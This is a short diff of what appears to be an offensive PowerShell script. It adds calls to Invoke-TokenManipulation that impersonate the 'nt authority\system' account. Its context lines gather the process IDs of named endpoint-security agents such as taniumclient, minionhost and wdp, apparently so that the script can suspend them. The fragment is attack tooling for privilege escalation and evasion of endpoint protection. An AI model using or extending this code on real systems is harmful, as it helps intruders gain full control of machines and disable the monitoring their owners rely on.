@@ -2017,6 +2017,8 @@ function UnPause-Process {
     }
 }
 
+Invoke-TokenManipulation -ImpersonateUser -Username "nt authority\system"
+Invoke-TokenManipulation -whoami
 
 $AV = "taniumclient","snac64","pylumloader","minionhost","bcua-service","bcua-notifier","wdp"
 $processes = Get-Process $AV -ea silentlycontinue |Select -expand ID
